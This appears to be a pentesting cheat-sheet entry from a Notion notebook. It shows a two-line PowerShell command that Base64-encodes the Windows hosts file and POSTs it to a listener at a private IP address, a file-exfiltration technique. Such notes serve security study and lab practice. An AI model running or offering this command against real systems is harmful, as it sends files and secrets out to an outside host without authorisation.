# Powershell Upload file after converting it to Base64

OS: Windows
Description: PowerShell: Upload file
Security Domains: File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

```jsx
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```